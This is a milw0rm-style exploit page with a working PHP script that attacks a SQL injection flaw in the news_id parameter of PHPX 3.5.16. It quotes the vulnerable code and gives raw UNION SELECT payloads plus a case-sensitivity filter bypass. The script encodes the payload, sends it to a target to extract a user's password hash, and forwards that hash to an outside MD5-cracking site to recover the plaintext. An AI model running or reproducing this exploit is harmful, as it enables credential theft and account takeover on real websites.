<html><head><title>PHPX 3.5.16 (news_id) Remote SQL Injection Exploit</title></head><pre>&lt;?php

error_reporting(0);
ini_set(&quot;default_socket_timeout&quot;,5);
set_time_limit(0);



/*
   ---------------------------------------------------
   PHP X 3.5.16 (news_id) Remote SQL Injection Exploit
   ---------------------------------------------------
   By StAkeR[at]hotmail[dot]it
   Download On http://www.phpx.org/project.php
   NOTE: Magic_Quotes_GPC OFF
   ---------------------------------------------------
   
   File (admin/includes/news.inc.php)
   
   1. &lt;?php
   2. #$Id: news.inc.php,v 1.46 2006/12/18 05:51:47 ryan Exp $
   3.
   4.
   5. class newsModule{
   6.
   7. function newsModule(){
   8.
   9.
  10.
  11. $this-&gt;action = $_GET['action'];
  12. $this-&gt;news_id = $_GET['news_id'];
  13.
  14. global $userinfo;
  15. global $core;
  16.
  17. $this-&gt;core = $core;
  18.
  19. $this-&gt;userinfo = $userinfo;
  20.
  21.
  22.
  23.
  24. if (!$this-&gt;userinfo){ DIE(&quot;HACK ATTEMPT&quot;); }
  25. if ($this-&gt;userinfo[news] != 1){ DIE(&quot;NO ACCESS TO THIS MODULE&quot;); }
  26.
  27. include(&quot;includes/text.inc.php&quot;);
  28. $this-&gt;textFun = new textFunctions();
  29. $this-&gt;newsCat = $this-&gt;core-&gt;db-&gt;dbCall(&quot;news_categories&quot;);
  30. if ($this-&gt;news_id == ''){ $this-&gt;news_id = $_POST['news_id']; }
  31.
  32. switch($this-&gt;action){
  33. case &quot;catrss&quot;:
  34. $this-&gt;catRSS();
  35. break;
      ...
   
   i've found other bugs..:D
  

   news.php?action=view&amp;news_id=1 ' union all select 1,2,username,4,5,password,7,8 from users where user_id=1/*
   Result? HACKING ATTEMPT...but this fix is very stupid because isn't case sensitive...
   news.php?action=view&amp;news_id=1 ' UNION ALL SELECT 1,2,username,4,5,password,7,8 from users where user_id=1/*
   
 
  
*/   


$search = new search;


if(preg_match('/http://(.+?)/i',$argv[1]) or !is_numeric($argv[2])) $search-&gt;argv();


$uid = intval($argv[2]);
$host = explode('/',$argv[1]);
$search-&gt;magic();

$code = &quot;\x31\x25\x32\x30\x25\x32\x37\x25\x32&quot;.
        &quot;\x30\x55\x4E\x49\x4F\x4E\x25\x32\x30&quot;.
        &quot;\x41\x4C\x4C\x25\x32\x30\x53\x45\x4C&quot;.
        &quot;\x45\x43\x54\x25\x32\x30\x31\x25\x32&quot;.
        &quot;\x43\x32\x25\x32\x43\x75\x73\x65\x72&quot;.
        &quot;\x6E\x61\x6D\x65\x25\x32\x43\x34\x25&quot;.
        &quot;\x32\x43\x35\x25\x32\x43\x70\x61\x73&quot;.
        &quot;\x73\x77\x6F\x72\x64\x25\x32\x43\x37&quot;.
        &quot;\x25\x32\x43\x38\x25\x32\x30\x66\x72&quot;.
        &quot;\x6F\x6D\x25\x32\x30\x75\x73\x65\x72&quot;.
        &quot;\x73\x25\x32\x30\x77\x68\x65\x72\x65&quot;.
        &quot;\x25\x32\x30\x75\x73\x65\x72\x5F\x69&quot;.
        &quot;\x64\x25\x33\x44&quot;.$uid.&quot;\x25\x32\x33&quot;;
        


$data .= &quot;GET /$host[1]/news.php?action=view&amp;news_id=$code HTTP/1.1\r\n&quot;; 
$data .= &quot;Host: $host[0]\r\n&quot;;
$data .= &quot;User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n&quot;;
$data .= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;
$data .= &quot;Accept-Language: en-us,en;q=0.5\r\n&quot;;
$data .= &quot;Accept-Encoding: gzip,deflate\r\n&quot;;
$data .= &quot;Connection: close\r\n\r\n&quot;;
    
  
  
if(!$socket = socket_create(AF_INET,SOCK_STREAM,SOL_TCP)) die(&quot;socket_create() error!\r\n&quot;);
if(!socket_set_option($socket,SOL_SOCKET,SO_BROADCAST,1)) die(&quot;socket_set_option() error!\r\n&quot;); 
if(!socket_connect($socket,gethostbyname($host[0]),80)) die(&quot;socket_connect() error!\r\n&quot;);
if(!socket_write($socket,$data,strlen($data))) die(&quot;socket_write() errror!\r\n&quot;);

while($html = socket_read($socket,1024,PHP_NORMAL_READ)) 
{ 
  $content .= $html; 
} socket_close($socket);



if(preg_match('/&lt;br&gt;&lt;br&gt;([0-9a-f]{32})/',$content,$result))
{
  echo &quot;[+] Exploit Successfully!\r\n&quot;;
  echo &quot;[+] Hash: $result[1]\r\n&quot;;
  echo $search-&gt;md5($result[1]);

}
else
{
  echo &quot;[+] Exploit Failed!\r\n&quot;;
  echo &quot;[+] Site Not Vulnerable / ID Not Valid!\r\n&quot;;
  exit;
}

class search
{
  function md5($hash)
  {
    if(strlen($hash) != 32) die(&quot;hash not valid!\r\n&quot;);
  
    $data .= &quot;GET /?p&amp;submit&amp;s=md5&amp;q=$hash&amp;_= HTTP/1.1\r\n&quot;; 
    $data .= &quot;Host: md5.rednoize.com\r\n&quot;;
    $data .= &quot;User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n&quot;;
    $data .= &quot;Connection: close\r\n\r\n&quot;;
  
    if(!$socket = fsockopen('md5.rednoize.com',80)) die(&quot;fsockopen() error!\n&quot;);  
    if(!fputs($socket,$data)) die(&quot;fputs() error!\n&quot;);


    while(!feof($socket))
    {
      $content .= fgets($socket);
    } fclose($socket);
  
    $result = explode(' ',$content);
  
    if(isset($result[19]))
    {
      return &quot;[+] Password: &quot;.substr($result[19],20,-6).&quot;\r\n&quot;;
    }
  }
  
  function argv()
  {
    echo &quot;[+] PHP X 3.5.16 (news_id) Remote SQL Injection Exploit\r\n&quot;;
    echo &quot;[+] Usage: php $argv[0] [host/path] [user_id]\r\n&quot;;
    echo &quot;[+] Usage: php $argv[0] localhost/phpx 1\r\n&quot;;
    exit;
  }
  
  function magic()
  {
    global $host;
    
    $data .= &quot;GET /$host[1]/news.php?action=view&amp;news_id=' HTTP/1.1\r\n&quot;; 
    $data .= &quot;Host: $host[0]\r\n&quot;;
    $data .= &quot;User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n&quot;;
    $data .= &quot;Connection: close\r\n\r\n&quot;;
  
    if(!$socket = fsockopen($host[0],80)) die(&quot;fsockopen() error!\n&quot;);  
    if(!fputs($socket,$data)) die(&quot;fputs() error!\n&quot;);

    while(!feof($socket))
    {
      $content .= fgets($socket);
    } fclose($socket);
    
    if(!eregi('error in your SQL',$content))
    {
      echo &quot;[+] Magic Quotes On!\r\n[+] Exploit Failed!\r\n&quot;;
      exit;
    }
  }
}

# milw0rm.com [2008-11-05]</pre></html>